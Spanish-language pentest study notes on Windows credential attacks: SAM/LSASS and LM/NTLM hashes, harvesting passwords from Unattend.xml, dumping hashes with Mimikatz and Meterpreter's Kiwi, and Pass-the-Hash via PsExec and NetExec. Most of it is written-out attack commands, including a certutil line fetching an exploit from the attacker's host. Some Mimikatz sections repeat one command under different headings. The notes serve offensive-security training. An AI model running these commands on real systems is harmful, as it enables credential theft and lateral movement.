----
### WINDOWS PASSWORD HASHES

#### ¿DÓNDE GUARDA WINDOWS LAS CONTRASEÑAS?

Windows **NO guarda contraseñas en texto claro**.  
Guarda **hashes** de las contraseñas en la **SAM**.

##### ¿QUÉ ES LA SAM?

**SAM (Security Account Manager)** es una **base de datos local** que contiene:

- usuarios locales
- hashes de contraseñas
- información de seguridad asociada a las cuentas

📍 Ubicación:

`C:\Windows\System32\config\SAM`

#### ¿POR QUÉ NO SE PUEDE COPIAR LA SAM EN CALIENTE?

- La SAM está **bloqueada mientras el sistema está en ejecución**
- Windows no permite copiarla directamente

👉 Por eso los atacantes:

- **no copian la SAM**
- **extraen los hashes desde memoria**

#### LSA Y LSASS

### 🔹 LSA (Local Security Authority)

- componente lógico de Windows
- se encarga de:
    - autenticación
    - validación de credenciales
    - políticas de seguridad

### 🔹 LSASS (`lsass.exe`)

- proceso que implementa LSA
- **contiene en memoria**:
    - hashes
    - credenciales
    - tickets Kerberos

🎯 **Objetivo prioritario de los atacantes**

#### ¿CÓMO SE OBTIENEN LOS HASHES?

Como la SAM no se puede copiar directamente:

- se usan **técnicas in-memory**
- se dumpea la memoria de:
    `lsass.exe`

Herramientas típicas:

- mimikatz
- meterpreter
- procdump (LOLBin)

📌 Requiere:

- **privilegios de administrador**
- o SYSTEM
## SYSKEY (IMPORTANTE)

En versiones modernas de Windows:

- la SAM está **cifrada con una SYSKEY**
- la clave está protegida por el sistema

👉 Pero:

- LSASS necesita esa clave en memoria
- el atacante **la obtiene al dumpear LSASS**

## TIPOS DE HASHES EN WINDOWS

## LM HASH (LEGACY – MUY DÉBIL)

### ¿QUÉ ES LM?

**LM (LAN Manager)** es un algoritmo de hash antiguo usado en:

- Windows anteriores a **NT 4.0**    
- sistemas muy legacy

📌 Hoy está **obsoleto y deshabilitado por defecto**

### PROCESO DE HASH LM

1️⃣ La contraseña se divide en **dos bloques de 7 caracteres**  
2️⃣ Todos los caracteres se convierten a **MAYÚSCULAS**  
3️⃣ Cada bloque se hashea **por separado**  
4️⃣ Se usa el algoritmo **DES**

👉 Resultado: **dos hashes independientes**
### ¿POR QUÉ ES INSEGURO?

- no usa salt
- no es case-sensitive
- divide la contraseña
- permite:
    - fuerza bruta rápida
    - rainbow tables

📌 Por eso LM está **considerado roto**
## NTLM HASH (EL ACTUAL)

### ¿QUÉ ES NTLM?

**NTLM** es una **familia de protocolos de autenticación** usados por Windows.

📌 Importante:

- NTLM ≠ NTLMv1 ≠ NTLMv2
- aquí hablamos del **NT hash**

### ¿CÓMO SE CREA EL NT HASH?

Cuando se crea una cuenta:

`NT hash = MD4(UTF-16LE(password))`

- la contraseña original **se descarta**    
- solo queda el hash

📌 Se usa **MD4** (débil, pero heredado)
### DESDE WINDOWS VISTA EN ADELANTE

- ❌ LM deshabilitado por defecto
- ✔ solo se usa **NTLM**

## MEJORAS DE NTLM FRENTE A LM

NTLM mejora LM en que:

- no divide la contraseña en bloques
- es **case-sensitive**
- permite:
    - símbolos
    - caracteres Unicode
- soporta contraseñas largas

👉 Aun así:

- **MD4 está roto**
- el problema real es:
    - pass-the-hash
    - relay
    - diseño legacy
## ¿POR QUÉ SIGUE SIENDO PELIGROSO?

Porque si un atacante obtiene el **NT hash**:

- puede autenticarse **sin conocer la contraseña**
- puede hacer:
    - Pass-the-Hash
    - movimiento lateral
    - NTLM relay

👉 No necesita crackear nada.

---
# SEARCHING FOR PASSWORDS IN WINDOWS CONFIGURATION FILES

## ¿POR QUÉ EXISTEN ESTOS ARCHIVOS?

Windows permite **automatizar tareas repetitivas**, como:

- despliegues masivos
- instalaciones desatendidas
- clonación de sistemas
- rollouts corporativos

Esto se hace mediante **Unattended Windows Setup**.

👉 Durante la instalación, Windows usa **archivos de configuración** que incluyen:

- idioma
- zona horaria
- nombre del equipo
- **credenciales (incluida la del Administrator)**
## EL PROBLEMA DE SEGURIDAD

Si estos archivos:

- **no se eliminan tras la instalación**
- o tienen permisos laxos

👉 **pueden revelar credenciales en texto claro u “ofuscadas”**

📌 Esto es **post-exploitation puro**.
## RUTAS IMPORTANTES A COMPROBAR

Las más típicas:
`C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Autounattend.xml`
Otras posibles:
`C:\Unattend.xml C:\Autounattend.xml C:\Windows\System32\Sysprep\`

## ¿LAS CONTRASEÑAS ESTÁN EN BASE64?

Sí… pero **NO es seguridad** 😂

👉 Base64 **no cifra**, solo **codifica**.

- cualquiera puede decodificarlo    
- es reversible
- se usa solo para “no mostrarla a simple vista”

Ejemplo típico en XML:

`<Password>   <Value>QWRtaW5QYXNzMTIz</Value>   <PlainText>false</PlainText> </Password>`

Eso no protege nada.
## ESCENARIO DE ATAQUE (FLUJO REAL)

### 1️⃣ Acceso a la máquina  (en su powershell)

pdemos subir a la maquina PowerSploit
hacemos:
1. powershell -ep bypass
2. .  .\PowerUp.ps1
3. Invoke-PrivescAudit
4. veremos alrchivos Unattended.xml si los hay -> hacerle un cat a la ruta
## BÚSQUEDA DE ARCHIVOS DESDE METERPRETER

### 2️⃣ Buscar archivos de instalación

para solo mostrar los directorios en windows:
`dir /a:d`
para buscar con regex:
`dir *.txt /s /b`

`search -f Unattend.xml`
Si no aparece nada:
`cd C:\ cd Windows\Panther dir`
o
`cd C:\ cd Windows\System32\config dir`
si no tenemos privilegios para entrar en config:
`getprivs` -> nos da los privilegios actuales -> si esta SetImpersonaterivilege podemos escalar facil ->
`getsystem` 
### 3️⃣ Descargar el archivo sospechoso

`download Unattend.xml`
(O `Autounattend.xml` si existe)

## ANÁLISIS DEL ARCHIVO

### 4️⃣ Buscar contraseñas

En tu máquina:

`cat Unattend.xml | grep -i password`

Busca campos como:

- `<Password>`
- `<Value>`
- `<AdministratorPassword>`
### 5️⃣ Decodificar la contraseña Base64

Ejemplo:

`echo QWRtaW5QYXNzMTIz | base64 -d`

Resultado:

`AdminPass123`

🎯 **Credencial recuperada**

## USAR LA CONTRASEÑA OBTENIDA

Si es la contraseña del administrador local o de dominio:
### Con Impacket PsExec

`impacket-psexec Administrator@IP`

O:

`psexec.py Administrator@IP`

Introduce la contraseña cuando la pida.

👉 Resultado:

- shell remota
- normalmente como **SYSTEM**

## NOTA SOBRE SUBIDA DE ARCHIVOS (LOLBIN)

Si necesitas subir algo a la víctima:
### En tu máquina

`python3 -m http.server 80`

### En la víctima

`certutil -urlcache -f http://TU_IP/exploit.exe exploit.exe`

📌 **Living-off-the-Land clásico**.

---
# DUMPING HASHES WITH MIMIKATZ

## ¿QUÉ ES MIMIKATZ?

**Mimikatz** es una herramienta de **post-explotación en Windows** usada para:

- extraer **credenciales en texto claro**
- dumpear **hashes NTLM**
- obtener **tickets Kerberos**
- extraer secretos de autenticación del sistema

Fue creada por **Benjamin Delpy (gentilkiwi)**.

👉 Es una de las herramientas **más importantes y peligrosas** en entornos Windows.

## ¿DE DÓNDE SACA LAS CREDENCIALES?

Mimikatz ataca principalmente el proceso:

`lsass.exe`

**LSASS (Local Security Authority Subsystem Service)**:

- gestiona autenticación    
- guarda en memoria:
    - hashes
    - credenciales
    - tickets Kerberos

📌 Por eso:

- **requiere privilegios elevados**
- normalmente **NT AUTHORITY\SYSTEM**

## FORMAS DE USAR MIMIKATZ

### 1️⃣ Ejecutable clásico (`mimikatz.exe`)

- se sube a la máquina víctima
- se ejecuta desde CMD / PowerShell

### 2️⃣ Módulo Kiwi (Meterpreter)

- versión integrada en Metasploit
- más cómodo
- menos ruido visual

## ESCENARIO DE ATAQUE (CON METERPRETER)

### 1️⃣ Obtener acceso inicial

Ejemplo:

`search badblue_passthru use exploit/windows/http/badblue_passthru`

### 2️⃣ Comprobaciones iniciales

`sysinfo        # arquitectura (x86 / x64) getuid         # usuario actual`

### 3️⃣ Migrar a un proceso estable

`pgrep lsass    # OJO: normalmente NO se migra a LSASS pgrep explorer migrate PID`

📌 Nota importante:

- **NO se recomienda migrar a lsass.exe**
- se migra a `explorer.exe`
- luego se escalan privilegios

### 4️⃣ Escalar a SYSTEM

`getsystem getuid`

Resultado esperado:

`NT AUTHORITY\SYSTEM`

## USO DE MIMIKATZ CON KIWI (METERPRETER)

### 5️⃣ Cargar Kiwi

`load kiwi`

Ver comandos disponibles:

`?`

### 6️⃣ Extraer credenciales

#### 🔹 Todas las credenciales disponibles

`creds_all`

Devuelve:

- hashes NTLM    
- contraseñas en texto claro (si existen)
- tickets Kerberos
#### 🔹 Dumpear la SAM (hashes NTLM)

`lsa_dump_sam`
#### 🔹 Dumpear secretos del sistema

`lsa_dump_secrets`

Puede revelar:

- contraseñas en texto claro
- claves de servicios
- **SYSKEY**
## USO DE MIMIKATZ SIN METERPRETER

### 1️⃣ Preparar directorio

`cd C:\ mkdir Temp cd Temp`

### 2️⃣ Subir mimikatz.exe

`upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`

(usar x86 o x64 según `sysinfo`)

### 3️⃣ Ejecutar Mimikatz

`shell .\mimikatz.exe`

### 4️⃣ Habilitar privilegios de debug

`privilege::debug`

Si devuelve:

`Privilege '20' OK`

✔ Tenemos permisos suficientes.

## COMANDOS IMPORTANTES EN MIMIKATZ

### 🔹 Dumpear hashes NTLM

`privilege::debug`
### 🔹 Dumpear secretos del sistema

`privilege::debug`

Puede mostrar:

- contraseñas de servicios
- credenciales en texto claro
- claves LSA
### 🔹 Credenciales de usuarios logueados

`privilege::debug`

📌 Este comando:

- intenta mostrar **contraseñas en texto claro**
- solo funciona si:
    - el sistema está mal configurado
    - o no hay protecciones modernas (LSA Protection)

---
## EXPLOITING PASS-THE-HASH ATTACK

### ¿qué es Pass-the-Hash?

**Pass-the-Hash (PtH)** es una técnica de explotación en la que un atacante **utiliza hashes NTLM robados** para **autenticarse directamente** en servicios Windows **sin necesidad de conocer la contraseña en texto plano**.

En Windows, muchos servicios (SMB, WinRM, PsExec) **aceptan hashes NTLM como método de autenticación**, por lo que si se obtiene el hash, se puede acceder como si se tuviera la contraseña.

👉 No se crackea la contraseña  
👉 Se reutiliza el hash **tal cual**  
👉 Ataque típico de **movimiento lateral**
### ¿en qué situación se usa?

Pass-the-Hash se utiliza cuando:

- ya tenemos acceso a **una máquina Windows**
- hemos obtenido **hashes NTLM** (SAM / LSASS)
- el mismo usuario existe en **otras máquinas**
- queremos **movernos lateralmente** por la red

Muy común en:

- entornos **Active Directory**
- redes Windows mal segmentadas
- usuarios reutilizando credenciales
## herramientas:

- **Metasploit (PsExec module)**  
    👉 Para ejecutar comandos remotamente usando hashes NTLM.
    
- **CrackMapExec (actualmente NetExec / nxc)**  
    👉 Herramienta rápida para **validar hashes y ejecutar comandos**.
## desde Metasploit:

- **obtener acceso inicial (ejemplo vulnerable):**
    `search badblue_passthru set RHOSTS IP run`
    
- **en meterpreter, localizar el proceso LSASS:**
    `pgrep lsass`
    
- **migrar al proceso LSASS:**
    `migrate PID`
    👉 Necesario para volcar credenciales.
    
- **cargar kiwi (mimikatz en MSF):**
    `load kiwi`
    
- **volcar hashes NTLM desde SAM:**
    `lsa_dump_sam`
    👉 Obtiene hashes **LM y NTLM**.
    
- **alternativa rápida:**
    `hashdump`
    👉 Copiar **usuario : RID : LM : NTLM**  
    (LM suele ser inútil, el importante es **NTLM**).
## usar Pass-the-Hash con PsExec (Metasploit):

- **buscar módulo PsExec:**
    `search psexec use exploit/windows/smb/psexec`
    
- **configuración básica:**
    `set RHOSTS IP set SMBUser usuario set SMBPass hash_NTLM set TARGET Native\ upload run`

👉 Obtienes **ejecución remota como SYSTEM** si el usuario tiene privilegios.
## manual (NetExec / CrackMapExec):

- **comprobar si el hash es válido:**
    `nxc smb IP -u usuario -H HASH_NTLM`
    👉 Si aparece `Pwned!` → hash reutilizable.
    
- **ejecutar comandos remotamente:**
    `nxc smb IP -u usuario -H HASH_NTLM -x "whoami"`

- **psexec manual:**
	`impacket-psexec Administrator@192.168.1.10 -hashes :aad3b435b51404eeaad3b435b51404ee`

